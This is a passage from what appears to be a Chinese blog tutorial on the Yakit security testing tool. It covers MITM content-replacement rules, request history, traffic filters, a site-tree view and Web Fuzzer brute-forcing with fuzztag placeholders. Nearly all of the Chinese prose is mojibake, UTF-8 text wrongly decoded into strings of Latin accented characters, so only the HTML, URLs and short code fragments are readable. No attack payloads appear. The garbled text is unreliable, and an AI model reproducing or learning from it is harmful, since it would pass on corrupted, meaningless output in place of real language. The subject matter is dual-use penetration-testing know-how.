åŠ«æŒè¿‡ç¨‹ä¸­åŠ¨æ€ä¿®æ”¹ã€‚</p><p>åœ¨å¼€å§‹åŠ«æŒé¡µé¢çš„å†…å®¹è§„åˆ™é€‰é¡¹æˆ‘ä»¬å¯ä»¥çœ‹åˆ° â‘ <code>é»˜è®¤é…ç½®</code> â‘¡ <code>å¯¼å…¥é…ç½®</code> â‘¢<code>å¯¼å‡ºé…ç½®</code> ä¸‰ä¸ªä¸å†…å®¹è§„åˆ™ç›¸å…³çš„æ“ä½œé€‰é¡¹ã€‚</p><p>æˆ‘ä»¬ç‚¹å‡»é»˜è®¤é…ç½®é€‰é¡¹ã€‚åœ¨å¼¹å‡ºçš„å¯¹è¯æ¡†ä¸­ï¼Œç‚¹å‡» â‘ <code>ä½¿ç”¨é»˜è®¤é…ç½®</code>ï¼Œå¯¼å…¥JSONä»¥åï¼Œç‚¹å‡» â‘¡<code>å¯¼å…¥</code></p><p>å³å¯çœ‹åˆ°æˆåŠŸå¯¼å…¥å®˜æ–¹é»˜è®¤çš„55æ¡è§„åˆ™å†…å®¹ï¼Œå¦‚æœæƒ³ä½¿ç”¨å…¶ä»–è§„åˆ™ï¼Œåªéœ€å°†JSONæ–‡ä»¶å¤åˆ¶è¿›æ¥ï¼Œç‚¹å‡»å¯¼å…¥å³å¯ã€‚</p><p><strong>æ³¨æ„</strong>ï¼Œ<code>å…¨éƒ¨æ›¿æ¢</code>æ˜¯æœ¬åœ°å¯¼å…¥çš„è§„åˆ™æ˜¯å¦éœ€è¦è¦†ç›–ä¹‹å‰å¯¼å…¥çš„è§„åˆ™ï¼Œå¦‚æœæ˜¯æ–°å¢è§„åˆ™è¯·å°†å…¨éƒ¨æ›¿æ¢å…³é—­ï¼Œå¦‚æœæ˜¯æƒ³è¿›è¡Œè¦†ç›–ï¼Œåˆ™å¯å¼€å¯å…¨éƒ¨æ›¿æ¢ã€‚</p><p>ç‚¹å‡»å†…å®¹è§„åˆ™æ—è¾¹çš„å°é½¿è½®ï¼Œå³å¯æŸ¥çœ‹å®˜æ–¹é»˜è®¤è§„åˆ™å†…å®¹ï¼Œå®˜æ–¹è§„åˆ™å¦‚å›¾æ‰€ç¤ºï¼š</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2013.39.32.png" style="zoom:50%;"><p>ç‚¹å‡»å³ä¸Šè§’çš„<code>å¯¼å‡ºé…ç½®</code>ï¼Œå¯ä»¥å°†è§„åˆ™å¯¼å‡ºä¸ºJSONæ–‡ä»¶ï¼Œå¯å°†æ–‡ä»¶è¿›è¡Œåˆ†äº«ç»™ä»–äººä½¿ç”¨ã€‚</p><h3 id="11-7-2-æ–°å»º-ç¼–è¾‘è§„åˆ™"><a href="#11-7-2-æ–°å»º-ç¼–è¾‘è§„åˆ™" class="headerlink" title="11.7.2 æ–°å»º/ç¼–è¾‘è§„åˆ™"></a>11.7.2 æ–°å»º/ç¼–è¾‘è§„åˆ™</h3><p>åœ¨åŠ«æŒé¡µé¢ç‚¹å‡»å³ä¸Šè§’<code>è§„åˆ™é…ç½®</code>å¯ä»¥æŸ¥çœ‹å·²æœ‰è§„åˆ™</p><p>ç¼–å†™è§„åˆ™çš„éƒ¨åˆ†é‡‡ç”¨ Golang é£æ ¼æ­£åˆ™è¡¨è¾¾å¼ï¼šæ¨èä½¿ç”¨ <a href="https://regex101.com/">https://regex101.com/</a> è°ƒè¯•ï¼Œè§„åˆ™å¦‚æœç¼–è¯‘å¤±è´¥ï¼Œåˆ™è‡ªåŠ¨é™çº§ä¸ºå…³é”®å­—åŒ¹é…ã€‚</p><p>å·²æœ‰çš„è§„åˆ™å¯ä»¥è¿›è¡Œç¼–è¾‘æ“ä½œï¼Œæˆ–è€…æ–°å¢è§„åˆ™ï¼Œç¼–è¾‘æˆ–æ–°å¢ä»¥åç‚¹å‡»<code>æ·»åŠ è¯¥è§„åˆ™</code>æˆ– <code>ä¿®æ”¹</code>è¿›è¡Œä¿å­˜ã€‚</p><h3 id="11-7-3-æ ‡è®°æ›¿æ¢æµé‡æ¡ˆä¾‹"><a href="#11-7-3-æ ‡è®°æ›¿æ¢æµé‡æ¡ˆä¾‹" class="headerlink" title="11.7.3 æ ‡è®°æ›¿æ¢æµé‡æ¡ˆä¾‹"></a>11.7.3 æ ‡è®°æ›¿æ¢æµé‡æ¡ˆä¾‹</h3><p><strong>æ ‡è®°æ›¿æ¢æ–‡æœ¬</strong></p><p>åœ¨è§„åˆ™å†…å®¹é¡µç‚¹å‡»å³ä¸Šè§’<code>æ–°å¢è§„åˆ™</code>ï¼Œç„¶åå¯¹æ¯ä¸ªé€‰é¡¹è¿›è¡Œé…ç½®ã€‚</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2013.45.08.png" alt="æˆªå±2024-12-25 13.45.08" style="zoom:50%;"><p>éå¸¸ç®€å•çš„é…ç½®å°±å¯ä»¥å®ç° â€œç™¾åº¦ä¸€ä¸‹â€ å˜ä¸º YAKä¸€ä¸‹ï¼</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2013.48.05.png" alt="æˆªå±2024-12-25 13.48.05" style="zoom:50%;"><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2013.48.23.png" style="zoom:50%;"><h3 id="ç»†èŠ‚è¯´æ˜"><a href="#ç»†èŠ‚è¯´æ˜" class="headerlink" title="ç»†èŠ‚è¯´æ˜"></a>ç»†èŠ‚è¯´æ˜</h3><ol><li>è¿™äº›è§„åˆ™æ˜¯ é’ˆå¯¹ä»£ç†å…¨æµé‡çš„ï¼Œä¸å…‰ä¼šå¯¹ç”¨æˆ·åœ¨ History çœ‹åˆ°çš„è¿‡æ»¤åçš„è¯·æ±‚ç”Ÿæ•ˆï¼Œå¯¹ä¸€äº›å·²ç»è¢«è¿‡æ»¤æ‰çš„ JS æˆ–è€…é™æ€æ–‡ä»¶éƒ½æ˜¯ç”Ÿæ•ˆçš„ï¼Œç¼–å†™ç®€å•è§„åˆ™åŠ¡å¿…æ˜ç¡®åœºæ™¯</li><li>è§„åˆ™çš„æ‰§è¡Œé¡ºåºæ˜¯æœ‰æ„ä¹‰çš„</li><li>è§„åˆ™åŸºäº Golang é£æ ¼æ­£åˆ™/Glob/å…³é”®å­—ï¼Œ é‡‡å–é™çº§ç­–ç•¥ï¼šå³å¦‚æœæ— æ³•ç¼–è¯‘ä¸ºæ­£åˆ™ï¼Œå°†ä¼šæœ€åè¢«é™çº§ä¸º â€œå…³é”®å­—â€ åŒ¹é…ã€‚</li><li>æ›¿æ¢åçš„æ•°æ®åŒ…å°†ä¼šè¢«è‡ªåŠ¨ä¿®å¤ï¼Œç”¨æˆ·ä¸éœ€æ‹…å¿ƒæ•°æ®åŒ…æ¯ååè®®ã€‚</li></ol><h2 id="11-8-History"><a href="#11-8-History" class="headerlink" title="11.8 History"></a>11.8 History</h2><p>æ‰€æœ‰æµç» Yakit çš„è¯·æ±‚ï¼Œéƒ½ä¼šåœ¨ History ä¸­è®°å½•ä¸‹æ¥ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¯¥é¡µé¢ï¼ŒæŸ¥çœ‹ä¼ è¾“çš„æ•°æ®å†…å®¹ï¼Œå¯¹æ•°æ®è¿›è¡Œæµ‹è¯•å’ŒéªŒè¯ã€‚åŒæ—¶ï¼Œå¯¹äºæ‹¦æˆªåˆ°çš„å†å²è¯·æ±‚ï¼Œéƒ½å¯ä»¥åŸºäº web fuzzerè¿›è¡Œè¿›ä¸€æ­¥çš„æµ‹è¯•ï¼Œä¹Ÿå¯ä»¥å¯¹æ•°æ®åŒ…è¿›è¡Œæ’ä»¶çš„æ‰«æç­‰ç­‰çš„æ“ä½œã€‚</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2013.53.49.png" style="zoom:50%;"><ol><li>å‹¾é€‰æˆ–å…¨é€‰æ•°æ®è¯·æ±‚ï¼Œå‹¾é€‰è¯·æ±‚åå¯ä»¥åˆ° â‘¡æ‰¹é‡æ“ä½œè¿›è¡Œæ‰¹é‡çš„æ“ä½œã€‚</li><li>æ‰¹é‡æ“ä½œï¼Œå…·ä½“å†…å®¹å¦‚å›¾æ‰€ç¤ºã€‚</li><li>ç­›é€‰æ¡†ï¼Œå¯ä»¥æ ¹æ®å¯¹åè®®ç±»å‹ã€å“åº”ç±»å‹ã€Tags å•ç‹¬æˆ–ç»„åˆè¿›è¡ŒæŒ‰æ¡ä»¶ç­›é€‰ã€‚</li><li>æŒ‡å®šå•ç‹¬çš„æŸæ¡æ•°æ®åŒ…ï¼Œå•å‡»å³é”®åå³å¯å¯¹è¯¥æ¡æ•°æ®è¿›è¡Œæ“ä½œï¼Œå…·ä½“å¯æ“ä½œå†…å®¹å¦‚å›¾æ‰€ç¤ºã€‚</li><li>HTTP history å†…å®¹ç­›é€‰å™¨ï¼Œ<code>MITM</code>ï¼š MITMäº¤äº’åŠ«æŒçš„æ‰€æœ‰æµé‡ï¼Œ<code>æ’ä»¶</code> ï¼šä½¿ç”¨ä»»ä½•æ’ä»¶éƒ½ä¼šåœ¨æ’ä»¶-historyç•™ä¸‹è¯·æ±‚è®°å½•ã€‚<code>çˆ¬è™«</code>ï¼šä¹‹å‰ç« èŠ‚å­¦ä¹ çš„åŸºç¡€å·¥å…·ä¸­çš„åŸºç¡€çˆ¬è™«å‘å‡ºçš„æ‰€æœ‰è¯·æ±‚éƒ½ä¼šè®°å½•åœ¨çˆ¬è™«â€“historyã€‚</li><li>ç‚¹å‡»<code>fuzz</code> è¯¥æ¡æ•°æ®ä¼šè¢«å‘é€è‡³ web fuzzeræ¨¡å—ã€‚</li><li>è¯¥æ•°æ®åŒ…ä¸­æ¶‰åŠçš„åŸŸåéƒ½ä¼šè¢«æå–å‡ºæ¥ã€‚</li><li>æ ¹æ®å…³é”®å­—æœç´¢æŸæ¡æ•°æ®åŒ…ã€‚</li><li>æ¸…ç©ºæ‰€æœ‰æ•°æ®ã€‚</li></ol><p>Historyä¸­çš„æ‰€æœ‰æ•°æ®åŒ…ï¼Œå‡æ”¯æŒå¯¹æ•°æ®åŒ…è¿›è¡Œå•ä¸ªæ“ä½œï¼Œæˆ–è€…æ‰¹é‡æ“ä½œï¼Œå…·ä½“æ“ä½œå¯åˆ†ä¸ºï¼š</p><ul><li>é€‰æ‹©æ•°æ®åŒ…è¿›è¡Œæ¼æ´æ‰«æ</li><li>å¤åˆ¶ä¸ºPOCæ¨¡æ¿ï¼ˆCSRF POPOC/yak POC/Portscan POCï¼‰</li><li>æ ‡è®°é¢œè‰²</li><li>æ•°æ®åŒ…ä½œä¸ºæ•°æ®å¯¹æ¯”</li><li>å±è”½åˆ é™¤</li><li>ä¸‹è½½ Response body</li></ul><p>å…¶æ¬¡é€‰æ‹©å•ä¸ªæ•°æ®åŒ…ä¹Ÿå¯ä»¥å¯¹æ•°æ®åŒ…è¿›è¡Œç¼–è§£ç ï¼Œä¿®æ”¹è¯·æ±‚ç±»å‹ç­‰æ“ä½œã€‚</p><p>Historyçš„æ¶ˆæ¯åˆ—è¡¨ä¸­ä¸»è¦åŒ…å«è¯·æ±‚åºåˆ—å·ã€è¯·æ±‚åè®®å’Œä¸»æœºåã€è¯·æ±‚çš„æ–¹å¼ã€æœåŠ¡å™¨ç«¯è¿”å›çš„HTTPçŠ¶æ€ç ã€URLè·¯å¾„ã€ç½‘ç«™titleã€ç½‘ç«™ipã€è¯·æ±‚é•¿åº¦ã€å¤§å°ã€ç­‰ä¿¡æ¯ã€‚</p><p>é€šè¿‡è¿™äº›ä¿¡æ¯ï¼Œæˆ‘ä»¬å¯ä»¥å¯¹ä¸€æ¬¡å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨ç«¯äº¤äº’çš„HTTPæ¶ˆæ¯è¯¦æƒ…åšå‡ºå‡†ç¡®çš„åˆ†æï¼ŒåŒæ—¶ï¼Œåœ¨æœ€å·¦è¾¹çš„æ“ä½œæ ï¼Œç‚¹å‡»æµè§ˆå™¨å›¾æ ‡å¯ä»¥åœ¨æµè§ˆå™¨ä¸­æ‰“å¼€è¯¥è¯·æ±‚å¯¹åº”çš„urlï¼Œç‚¹å‡»ç®­å¤´å›¾æ ‡å³å¯æŸ¥çœ‹è¯¥è¯·æ±‚è¯¦ç»†çš„å†…å®¹ã€‚</p><h2 id="11-9-è¿‡æ»¤æµé‡"><a href="#11-9-è¿‡æ»¤æµé‡" class="headerlink" title="11.9 è¿‡æ»¤æµé‡"></a>11.9 è¿‡æ»¤æµé‡</h2><p>åœ¨ä¸“å®¶æ¨¡å¼ MITM äº¤äº’åŠ«æŒæ—¶ä¼šäº§ç”Ÿå¤§é‡çš„æ—¥å¿—è®°å½•ï¼Œä¸ºäº†æ›´å‹å¥½çš„ç®¡ç†ï¼ŒYakitæä¾›äº†ç­›é€‰è¿‡æ»¤å™¨åŠŸèƒ½ã€‚é’ˆå¯¹æŸäº›æ•°æ®åŒ…æˆ‘ä»¬ä¸éœ€è¦çœ‹è§ï¼Œæˆ–è€…å±è”½æŸäº›æ±¡æŸ“æ•°æ®å°±å¯ä»¥è¾“å…¥éœ€è¦è¿‡æ»¤çš„æ¡ä»¶ï¼ŒåŠ«æŒæ—¶åˆ™ä¸ä¼šåŠ«æŒç¬¦åˆæ¡ä»¶çš„æ•°æ®åŒ…ã€‚</p><p>åœ¨åŠ«æŒé¡µé¢ç‚¹å‡»<code>è¿‡æ»¤å™¨</code>ï¼Œå°†å¼¹å‡ºç­›é€‰è¿‡æ»¤å™¨ç•Œé¢ã€‚</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2015.47.07.png" style="zoom:50%;"><p>æŒ‰ç…§è¿‡æ»¤æ¡ä»¶çš„ä¸åŒï¼Œè¿‡æ»¤å™¨åˆ’åˆ†å‡º5ä¸ªå­é€‰é¡¹ï¼Œåˆ†åˆ«æ˜¯ï¼š</p><ul><li>æŒ‰ç…§Hostnameè¿‡æ»¤ ä½ å¯ä»¥åœ¨<code>åŒ…å«Hostname</code> è¾“å…¥æƒ³è¦ä»…æ˜¾ç¤ºçš„hostnameï¼Œæ¥ç­›é€‰åªæƒ³è¦çœ‹åˆ°çš„ç›¸å…³Hostnameçš„è¯·æ±‚ã€‚ä¹Ÿå¯ä»¥åœ¨<code>æ’é™¤Hostname</code>ä¸­è¾“å…¥ä¸æƒ³è¦çœ‹åˆ°çš„Hostnameè¿›è¡Œæ’é™¤ã€‚</li><li>æŒ‰ç…§URLè·¯å¾„è¿‡æ»¤ ä½ å¯ä»¥åœ¨<code>åŒ…å«URLè·¯å¾„</code>è¾“å…¥æƒ³è¦URLè·¯å¾„æ¥åŒ¹é…ç›¸å…³çš„è¯·æ±‚ï¼Œä¹Ÿå¯ä»¥åœ¨<code>æ’é™¤URLè·¯å¾„</code>ä¸­è¾“å…¥ä¸æƒ³è¦å±•ç¤ºçš„URLæ¥è¿‡æ»¤ä¸æƒ³è¦çœ‹åˆ°çš„è¯·æ±‚ã€‚</li><li>æŒ‰ç…§æ–‡ä»¶ç±»å‹è¿‡æ»¤ é€šè¿‡æ–‡ä»¶ç±»å‹åœ¨è¿‡æ»¤æ¶ˆæ¯åˆ—è¡¨ï¼Œè¿™é‡Œæœ‰ä¸¤ä¸ªé€‰æ‹©å¯ä¾›æ“ä½œã€‚ä¸€æ˜¯ä»…ä»…æ˜¾ç¤ºå“ªäº›ï¼Œå¦ä¸€ä¸ªæ˜¯ä¸æ˜¾ç¤ºå“ªäº›ã€‚å¦‚æœæ˜¯ä»…ä»…æ˜¾ç¤ºå“ªäº›ï¼Œåœ¨åŒ…å«æ–‡ä»¶åç¼€çš„è¾“å…¥æ¡†ä¸­å¡«å†™æ˜¾ç¤ºçš„æ–‡ä»¶ç±»å‹ï¼ŒåŒæ ·ï¼Œå¦‚æœä¸æ˜¾ç¤ºå“ªäº›æ–‡ä»¶ç±»å‹ï¼Œåªè¦åœ¨<code>æ’é™¤æ–‡ä»¶åç¼€</code>çš„è¾“å…¥æ¡†ä¸­å¡«å†™ä¸éœ€è¦æ˜¾ç¤ºçš„æ–‡ä»¶ç±»å‹å³å¯ã€‚</li><li>æŒ‰ç…§Content-Typeè¿‡æ»¤ æ­¤è¿‡æ»¤å™¨çš„åŠŸèƒ½æ˜¯æŒ‡ï¼Œæ ¹æ®HTTPè¯·æ±‚å¤´çš„Content-Typeæ¥æ’é™¤ä¸æƒ³è¦å±•ç¤ºçš„ç›¸å…³æ•°æ®åŒ…ã€‚</li><li>æŒ‰ç…§HTTP æ–¹æ³•è¿‡æ»¤ æ­¤è¿‡æ»¤å™¨å¯æ ¹æ®HTTPè¯·æ±‚æ–¹æ³•è¿›è¡Œçš„æ’é™¤æ¥è¾¾åˆ°è¿‡æ»¤çš„ç›®çš„ã€‚</li></ul><p>ä»¥ä¸Šè¿‡æ»¤æ¡ä»¶å¯å•é€‰ï¼Œä¹Ÿå¯å¤šé€‰ç»„åˆæ¥è¿›è¡Œè¿‡æ»¤æµé‡ã€‚</p><h2 id="11-10-ç½‘ç«™æ ‘è§†è§’"><a href="#11-10-ç½‘ç«™æ ‘è§†è§’" class="headerlink" title="11.10 ç½‘ç«™æ ‘è§†è§’"></a>11.10 ç½‘ç«™æ ‘è§†è§’</h2><p>ç½‘ç«™æ ‘å°†å†å²è¯·æ±‚ä»¥æ ‘ç»“æ„çš„å½¢å¼è¿›è¡Œå±•ç¤ºï¼Œé€‰ä¸­åŸŸåï¼Œå¯æŸ¥çœ‹è¯¥åŸŸåå¯¹åº”çš„æ•°æ®ä¿¡æ¯ä¸è¯¦æƒ…ã€‚ä¸‹å›¾æ‰€ç¤ºç½‘ç«™æ ‘ä¸ºä¸€æ¬¡æµ‹è¯•ä¸­ï¼Œé€šè¿‡æµè§ˆå™¨æµè§ˆçš„å†å²è®°å½•åœ¨ç½‘ç«™æ ‘è§†è§’é¡µé¢ä¸­çš„å±•ç°ç»“æœã€‚</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2015.54.05.png" alt="æˆªå±2024-12-25 15.54.05" style="zoom:50%;"><p>ä»å›¾ä¸­æˆ‘ä»¬å¯ä»¥çœ‹å‡ºï¼Œæ•´ä¸ªé¡µé¢çš„çš„å·¦ä¾§ä¸ºè®¿é—®çš„URLï¼ŒæŒ‰ç…§ç½‘ç«™çš„å±‚çº§å’Œæ·±åº¦ï¼Œæ ‘å½¢å±•ç¤ºæ•´ä¸ªåº”ç”¨ç³»ç»Ÿçš„ç»“æ„å’Œå…³è”å…¶ä»–åŸŸçš„urlæƒ…å†µï¼›</p><p>å³è¾¹æ˜¾ç¤ºçš„æ˜¯æŸä¸€ä¸ªurlè¢«è®¿é—®çš„æ˜ç»†åˆ—è¡¨ï¼Œå…±è®¿é—®å“ªäº›urlï¼Œè¯·æ±‚å’Œåº”ç­”å†…å®¹åˆ†åˆ«æ˜¯ä»€ä¹ˆï¼Œéƒ½æœ‰ç€è¯¦å®çš„è®°å½•ã€‚</p><p>åŸºäºå·¦è¾¹çš„æ ‘å½¢ç»“æ„ï¼Œæˆ‘ä»¬å¯ä»¥é€‰æ‹©æŸä¸ªåˆ†æ”¯ï¼Œå¯¹æŒ‡å®šçš„è·¯å¾„è¿›è¡Œç«¯å£æ‰«æã€çˆ†ç ´å’Œæ¼æ´æ£€æµ‹ã€‚</p><h1 id="åäºŒã€Web-Fuzzer"><a href="#åäºŒã€Web-Fuzzer" class="headerlink" title="åäºŒã€Web Fuzzer"></a>åäºŒã€Web Fuzzer</h1><h2 id="12-1-é‡æ”¾"><a href="#12-1-é‡æ”¾" class="headerlink" title="12.1 é‡æ”¾"></a>12.1 é‡æ”¾</h2><p>åœ¨æ—¥å¸¸å·¥ä½œä¸­å¯ä»¥ä½¿ç”¨ Web Fuzzerè¿›è¡Œè¯·æ±‚ä¸å“åº”çš„æ¶ˆæ¯éªŒè¯åˆ†æï¼Œæ¯”å¦‚ä¿®æ”¹è¯·æ±‚å‚æ•°ï¼ŒéªŒè¯è¾“å…¥çš„æ¼æ´ï¼›ä¿®æ”¹è¯·æ±‚å‚æ•°ï¼ŒéªŒè¯é€»è¾‘è¶Šæƒï¼›ä»æ‹¦æˆªå†å²è®°å½•ä¸­ï¼Œæ•è·ç‰¹å¾æ€§çš„è¯·æ±‚æ¶ˆæ¯è¿›è¡Œè¯·æ±‚é‡æ”¾ã€‚</p><p>Web Fuzzer ç•Œé¢å¦‚å›¾æ‰€ç¤ºï¼š</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2016.02.00.png" style="zoom:50%;"><p>åœ¨å·¦ä¸Šè§’ï¼Œæœ‰ä¸€ä¸ª<code>å‘é€è¯·æ±‚</code>æŒ‰é’®ï¼Œå½“æˆ‘ä»¬å¯¹è¯·æ±‚çš„æ¶ˆæ¯ç¼–è¾‘å®Œä¹‹åï¼Œç‚¹å‡»æ­¤æŒ‰é’®å³å‘é€è¯·æ±‚ç»™æœåŠ¡å™¨ç«¯ã€‚</p><p>å“åº”æ¶ˆæ¯åŒºä¸ºå¯¹åº”çš„è¯·æ±‚æ¶ˆæ¯ç‚¹å‡»<code>å‘é€è¯·æ±‚</code>æŒ‰é’®åï¼ŒæœåŠ¡å™¨ç«¯çš„åé¦ˆæ¶ˆæ¯ã€‚é€šè¿‡ä¿®æ”¹è¯·æ±‚æ¶ˆæ¯çš„å‚æ•°æ¥æ¯”å¯¹åˆ†ææ¯æ¬¡åº”ç­”æ¶ˆæ¯ä¹‹é—´çš„å·®å¼‚ï¼Œèƒ½æ›´å¥½çš„å¸®åŠ©æˆ‘ä»¬åˆ†æç³»ç»Ÿå¯èƒ½å­˜åœ¨çš„æ¼æ´ã€‚</p><ul><li>ç®€å•æ¡ˆä¾‹. è¯·æ±‚å…¶ä»–ç½‘ç«™</li></ul><p>å‡å¦‚æˆ‘ä»¬éœ€è¦å°†è¯·æ±‚å‘é€åˆ°å…¶ä»–ç½‘ç«™ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ä¿®æ”¹<code>Host</code>è¯·æ±‚å¤´ï¼Œç„¶åç‚¹å‡»<code>å‘é€æ•°æ®åŒ…</code>æŒ‰é’®å³å¯ã€‚yaklangä¼šè‡ªåŠ¨è¯†åˆ«<code>Host</code>è¯·æ±‚å¤´ä¸­çš„åŸŸåå¹¶å°†è¯·æ±‚å‘é€åˆ°å¯¹åº”çš„æœåŠ¡å™¨ã€‚</p><p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2016.05.43.png" alt="æˆªå±2024-12-25 16.05.43"></p><h2 id="12-2-çˆ†ç ´"><a href="#12-2-çˆ†ç ´" class="headerlink" title="12.2 çˆ†ç ´"></a>12.2 çˆ†ç ´</h2><h3 id="12-2-1-æ¦‚è¿°"><a href="#12-2-1-æ¦‚è¿°" class="headerlink" title="12.2.1 æ¦‚è¿°"></a>12.2.1 æ¦‚è¿°</h3><p>ä½¿ç”¨è¿‡Burp Suiteçš„éƒ½çŸ¥é“ï¼Œå®ƒæœ‰ä¸€ä¸ªIntruderæ¨¡å—ï¼Œå®ƒçš„æ ¸å¿ƒå…¶å®å¹¶ä¸æ˜¯æŸä¸€ä¸ªåŠŸèƒ½ï¼Œè€Œæ˜¯ä¸€æ•´å¥—çš„æ“ä½œæµï¼š</p><ol><li>åŠ«æŒæ•°æ®åŒ…</li><li>å‘é€åˆ°Intruder</li><li>æ¸…é™¤å ä½ç¬¦ï¼Œæ·»åŠ æ–°çš„å ä½ç¬¦</li><li>ä¸ºå ä½ç¬¦è®¾ç½®ä¸€ä¸ªå€¼åºåˆ—ï¼Œå¦‚å­—å…¸ï¼Œå¤šè¡Œå­—ç¬¦ä¸²ï¼Œä¸€ä¸²æ•°å­—ç­‰</li><li>è®¾ç½®çˆ†ç ´æ¨¡å¼ï¼Œå¼€å§‹çˆ†ç ´</li></ol><p>åé¢å‡ æ­¥æ˜¯å¾ˆç¹ççš„ï¼Œå¾ˆå¤šæ—¶å€™å¤§å®¶èŠ±äº†å¤§åŠŸå¤«çš„æ—¶é—´åœ¨è®¾ç½®ä¸Šã€‚</p><p>Yakit ä½¿ç”¨äº†ä¸€ç§å…¨æ–°çš„æ–¹æ³•ï¼Œ<strong>å¯ä»¥ç›´æ¥åœ¨Web fuzzeræ¨¡å—ä¸­å®Œæˆé‡æ”¾ä¸çˆ†ç ´ä¸¤ç§å·¥ä½œ</strong>ï¼Œæ›´è½»æ¾åœ°å®ç°æ‰¹é‡å‘åŒ…æ¨¡ç³Šæµ‹è¯•ã€‚</p><h3 id="12-2-2-æ¨¡ç³Šæµ‹è¯•æ ‡ç­¾"><a href="#12-2-2-æ¨¡ç³Šæµ‹è¯•æ ‡ç­¾" class="headerlink" title="12.2.2 æ¨¡ç³Šæµ‹è¯•æ ‡ç­¾"></a>12.2.2 æ¨¡ç³Šæµ‹è¯•æ ‡ç­¾</h3><p>é¦–å…ˆï¼Œä»‹ç»æ¨¡ç³Šæµ‹è¯•æ ‡ç­¾(fuzztag)ã€‚</p><p>fuzztagæ˜¯ä¸€ç§å°å‹è¯­æ³•ç»“æ„ï¼Œå®ƒå¤§æ¦‚é•¿è¿™ä¸ªæ ·å­ï¼š<code>{{tagname(tagvalue)}}</code>ï¼Œä¾‹å¦‚<code>{{randint(1,100)}}</code>ç”Ÿæˆ1-100éšæœºæ•´æ•°ã€‚</p><p>fuzztagè¿˜æœ‰è®¸å¤šå˜ä½“ï¼Œä¾‹å¦‚å®ƒå¯ä»¥åµŒå¥—è°ƒç”¨ï¼š<code>{{base64(randint(100))}}</code>ç”Ÿæˆbase64ç¼–ç åçš„1-100éšæœºæ•´æ•°ã€‚</p><p>æƒ³è¦äº†è§£fuzztagå¯ç”¨æ ‡ç­¾å’Œä½¿ç”¨æ ·ä¾‹çš„åŒå­¦å¯ä»¥æŸ¥çœ‹è¿™ç¯‡æ–‡ç« ï¼š<a href="https://yaklang.com/docs/newforyak/fuzztag">Fuzz Tag Playbook</a>ã€‚</p><h3 id="12-2-3-ä½¿ç”¨æ¨¡ç³Šæµ‹è¯•æ ‡ç­¾è¿›è¡Œçˆ†ç ´"><a href="#12-2-3-ä½¿ç”¨æ¨¡ç³Šæµ‹è¯•æ ‡ç­¾è¿›è¡Œçˆ†ç ´" class="headerlink" title="12.2.3 ä½¿ç”¨æ¨¡ç³Šæµ‹è¯•æ ‡ç­¾è¿›è¡Œçˆ†ç ´"></a>12.2.3 ä½¿ç”¨æ¨¡ç³Šæµ‹è¯•æ ‡ç­¾è¿›è¡Œçˆ†ç ´</h3><h4 id="1ï¼‰ç›´æ¥è¾“å…¥fuzztag"><a href="#1ï¼‰ç›´æ¥è¾“å…¥fuzztag" class="headerlink" title="1ï¼‰ç›´æ¥è¾“å…¥fuzztag"></a>1ï¼‰ç›´æ¥è¾“å…¥fuzztag</h4><p>åœ¨æˆ‘ä»¬äº†è§£äº†fuzztagä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥å¼€å§‹ä½¿ç”¨å®ƒæ¥è¿›è¡Œçˆ†ç ´äº†ã€‚ä½¿ç”¨fuzztagæœ€ç›´æ¥çš„æ–¹å¼æ˜¯ç›´æ¥åœ¨Web fuzzeræ¨¡å—ä¸­è¾“å…¥ï¼Œä¾‹å¦‚æˆ‘ä»¬çˆ†ç ´æ•°å­—1-10ï¼Œåªéœ€è¦ç®€å•åœ°åœ¨æƒ³çˆ†ç ´çš„ä½ç½®è¾“å…¥<code>{{int(1-10)}}</code>å³å¯ï¼š</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2016.12.09.png" style="zoom:50%;"><p>å¯ä»¥çœ‹åˆ°å½“Web Fuzzerå‘é€äº†ä¸æ­¢ä¸€ä¸ªæ•°æ®åŒ…æ—¶ï¼ŒResponseè‡ªåŠ¨è½¬æ¢ä¸ºåˆ—è¡¨å½¢å¼å±•ç¤ºï¼Œå½“æˆ‘ä»¬ç‚¹å‡»Responseåˆ—è¡¨ä¸­çš„æŸä¸€é¡¹æ—¶ï¼Œä¼šåœ¨å³ä¸‹è§’æ˜¾ç¤ºè¿™æ¬¡è¯·æ±‚çš„å“åº”ï¼Œå¯ä»¥çœ‹åˆ°fuzztagå·²ç»è¢«æ›¿æ¢ä¸ºå®é™…çš„å€¼(è¿™é‡Œä¸º10)ï¼Œå¦å¤–æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡ç‚¹å‡»è½»æ¾åœ°åˆ‡æ¢æŸ¥çœ‹è¯·æ±‚ä¸å“åº”ã€‚</p><h4 id="2ï¼‰å³é”®æ’å…¥fuzztag"><a href="#2ï¼‰å³é”®æ’å…¥fuzztag" class="headerlink" 